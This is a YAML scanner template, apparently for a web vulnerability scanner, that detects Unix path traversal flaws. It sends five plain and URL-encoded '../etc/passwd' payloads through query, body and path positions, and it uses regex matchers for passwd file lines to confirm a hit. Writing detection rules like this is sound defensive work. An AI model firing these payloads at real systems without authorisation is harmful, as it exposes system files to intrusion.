id: traversal-unix
info:
  name: 'Path Traversal (Unix) 스캔'
  severity: 'high'
  description: '유닉스 계열 경로 탐색 취약점 탐지'

definition:
  method: ['GET', 'POST']
  position: ['query', 'body', 'path']

payloads:
  - '../../../../etc/passwd'
  - '../../../etc/passwd'
  - '....//....//....//etc/passwd'
  - '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
  - '..%2F..%2F..%2Fetc%2Fpasswd'

matchers-condition: or

matchers:
  - type: regex
    regex:
      - 'root:[x*]:0:0'
      - 'daemon:[x*]:\d+:\d+'
      - '/bin/(bash|sh|nologin)'
